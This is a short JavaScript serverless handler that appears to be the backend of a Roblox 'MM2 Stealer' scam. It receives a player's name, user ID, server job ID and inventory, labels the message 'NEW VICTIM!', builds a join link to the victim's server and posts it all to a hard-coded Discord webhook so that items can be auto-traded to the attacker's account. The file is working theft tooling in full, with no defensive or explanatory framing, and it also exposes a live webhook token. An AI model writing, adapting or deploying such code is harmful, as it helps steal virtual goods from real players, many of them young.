export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { player, userId, jobId, items, username } = req.body;

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";

    const joinLink = `https://ripples-joiner.vercel.app/?placeId=142823291&jobId=${jobId}`;

    let itemsText = "";
    for (const item of items || []) {
        itemsText += `${item.name} x${item.amount}\n`;
    }
    if (itemsText === "") itemsText = "No items";

    const message = `**🎯 NEW VICTIM!**

**Player:** ${player}
**User ID:** ${userId}
**Job ID:** \`${jobId}\`

**Inventory:**
${itemsText}

**Join Link:**
${joinLink}

**Auto-trading to:** ${username || "Nicename719"}`;

    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: message,
            username: "MM2 Stealer"
        })
    });

    return res.status(200).json({ success: true });
}
